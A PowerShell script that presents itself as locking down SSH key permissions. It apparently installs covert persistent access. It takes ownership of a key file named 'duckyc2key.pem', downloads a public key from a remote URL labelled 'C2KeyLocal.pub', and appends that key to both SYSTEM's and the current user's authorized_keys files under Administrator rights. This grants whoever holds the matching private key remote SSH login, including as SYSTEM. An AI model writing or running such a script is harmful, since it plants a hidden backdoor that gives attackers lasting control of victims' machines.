<#
.SYNOPSIS
    Locks down permissions for SSH key files for both SYSTEM and the current user.

.DESCRIPTION
    This script automates the process of securing SSH key files to meet the strict security
    requirements of tools like OpenSSH. It performs three main actions:
    1. Secures the private key file, allowing access only by the SYSTEM account.
    2. Downloads a remote public key, adds it to the SYSTEM's authorized_keys file, and secures it.
    3. Downloads the same public key, adds it to the current user's authorized_keys file, and secures it for both SYSTEM and the user.

.NOTES
    You MUST run this script in a PowerShell terminal with Administrator privileges.
#>

# ===================================================================================
# FUNCTION 1: Main Orchestrator for SSH Setup
# ===================================================================================
function Start-SshConfiguration {
    
    # --- HARD-CODED VALUE ---
    $FilePath = "C:\ProgramData\duckyc2key.pem"
    # --- END OF HARD-CODED VALUE ---

    if (-not (Test-Path -Path $FilePath -PathType Leaf)) {
        Write-Host "ERROR: The file '$FilePath' was not found. Halting script." -ForegroundColor Red
        return
    }

    Write-Host "--> Securing private key permissions for file: $FilePath"

    try {
        $acl = Get-Acl -Path $FilePath
        $owner = New-Object System.Security.Principal.NTAccount("NT AUTHORITY\SYSTEM")
        $acl.SetOwner($owner)
        $acl.SetAccessRuleProtection($true, $false)
        $existingRules = $acl.GetAccessRules($true, $false, [System.Security.Principal.SecurityIdentifier])
        foreach ($rule in $existingRules) {
            $acl.RemoveAccessRule($rule)
        }
        $permissions = [System.Security.AccessControl.FileSystemRights]"Read, ReadAndExecute"
        $accessType = [System.Security.Accesscontrol.AccessControlType]::Allow
        $newRule = New-Object System.Security.AccessControl.FileSystemAccessRule("NT AUTHORITY\SYSTEM", $permissions, $accessType)
        $acl.AddAccessRule($newRule)
        Set-Acl -Path $FilePath -AclObject $acl

        Write-Host "    SUCCESS: Private key permissions have been securely configured." -ForegroundColor Green
        
        # --- CALLING THE OTHER SETUP FUNCTIONS FROM WITHIN THIS ONE ---
        Set-SystemAuthorizedKey
        Set-UserAuthorizedKey

    }
    catch {
        Write-Host "    FAILURE: An error occurred while securing private key. Error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# ===================================================================================
# FUNCTION 2: Download and Secure the SYSTEM's Authorized Keys File
# ===================================================================================
function Set-SystemAuthorizedKey {
    # --- HARD-CODED VALUES ---
    $RemotePubKeyUrl = "C2KeyLocal.pub link" # <--- IMPORTANT: URL has been updated.
    $SshDirPath = "C:\Windows\System32\config\systemprofile\.ssh"
    $AuthorizedKeysPath = Join-Path $SshDirPath "authorized_keys"
    # --- END OF HARD-CODED VALUES ---

    Write-Host "--> Setting up and securing SYSTEM's authorized_keys file..."

    try {
        if (-not (Test-Path -Path $SshDirPath)) {
            New-Item -Path $SshDirPath -ItemType Directory -Force | Out-Null
            Write-Host "    Created directory: $SshDirPath"
        }
        $pubKeyContent = Invoke-RestMethod -Uri $RemotePubKeyUrl
        Add-Content -Path $AuthorizedKeysPath -Value $pubKeyContent
        Write-Host "    Public key content appended to $AuthorizedKeysPath"
        $acl = Get-Acl -Path $AuthorizedKeysPath
        $owner = New-Object System.Security.Principal.NTAccount("NT AUTHORITY\SYSTEM")
        $acl.SetOwner($owner)
        $acl.SetAccessRuleProtection($true, $false)
        $existingRules = $acl.GetAccessRules($true, $false, [System.Security.Principal.SecurityIdentifier])
        foreach ($rule in $existingRules) {
            $acl.RemoveAccessRule($rule)
        }
        $permissions = [System.Security.AccessControl.FileSystemRights]"Read, ReadAndExecute"
        $accessType = [System.Security.AccessControl.AccessControlType]::Allow
        $newRule = New-Object System.Security.AccessControl.FileSystemAccessRule("NT AUTHORITY\SYSTEM", $permissions, $accessType)
        $acl.AddAccessRule($newRule)
        Set-Acl -Path $AuthorizedKeysPath -AclObject $acl

        Write-Host "    SUCCESS: SYSTEM's authorized_keys file has been securely configured." -ForegroundColor Green
    }
    catch {
        Write-Host "    FAILURE: An error occurred during SYSTEM authorized_keys setup. Error: $($_.Exception.Message)" -ForegroundColor Red
    }
}

# ===================================================================================
# FUNCTION 3: Download and Secure the CURRENT USER's Authorized Keys File
# ===================================================================================
function Set-UserAuthorizedKey {
    # --- HARD-CODED VALUES ---
    $RemotePubKeyUrl = "C2KeyLocal.pub link" # <--- IMPORTANT: URL has been updated.
    # --- END OF HARD-CODED VALUES ---

    Write-Host "--> Setting up and securing CURRENT USER's authorized_keys file..."

    try {
        # Get current user's details
        $currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        $currentUserName = $currentUser.Name
        $userProfilePath = [Environment]::GetFolderPath("UserProfile")
        
        $SshDirPath = Join-Path $userProfilePath ".ssh"
        $AuthorizedKeysPath = Join-Path $SshDirPath "authorized_keys"

        if (-not (Test-Path -Path $SshDirPath)) {
            New-Item -Path $SshDirPath -ItemType Directory -Force | Out-Null
            Write-Host "    Created directory: $SshDirPath"
        }
        $pubKeyContent = Invoke-RestMethod -Uri $RemotePubKeyUrl
        Add-Content -Path $AuthorizedKeysPath -Value $pubKeyContent
        Write-Host "    Public key content appended to $AuthorizedKeysPath"
        
        # --- Secure the file, but for both SYSTEM and the Current User ---
        $acl = Get-Acl -Path $AuthorizedKeysPath
        $owner = New-Object System.Security.Principal.NTAccount($currentUserName)
        $acl.SetOwner($owner)
        $acl.SetAccessRuleProtection($true, $false)
        $existingRules = $acl.GetAccessRules($true, $false, [System.Security.Principal.SecurityIdentifier])
        foreach ($rule in $existingRules) {
            $acl.RemoveAccessRule($rule)
        }
        $permissions = [System.Security.AccessControl.FileSystemRights]"Read, ReadAndExecute"
        $accessType = [System.Security.AccessControl.AccessControlType]::Allow
        
        # Rule 1: For the Current User
        $userRule = New-Object System.Security.AccessControl.FileSystemAccessRule($currentUserName, $permissions, $accessType)
        $acl.AddAccessRule($userRule)
        
        # Rule 2: For SYSTEM
        $systemRule = New-Object System.Security.AccessControl.FileSystemAccessRule("NT AUTHORITY\SYSTEM", $permissions, $accessType)
        $acl.AddAccessRule($systemRule)

        Set-Acl -Path $AuthorizedKeysPath -AclObject $acl

        Write-Host "    SUCCESS: USER's authorized_keys file has been securely configured." -ForegroundColor Green
    }
    catch {
        Write-Host "    FAILURE: An error occurred during USER authorized_keys setup. Error: $($_.Exception.Message)" -ForegroundColor Red
    }
}


# --- SCRIPT EXECUTION ---
# You must run this in an Administrator PowerShell session.

Start-SshConfiguration


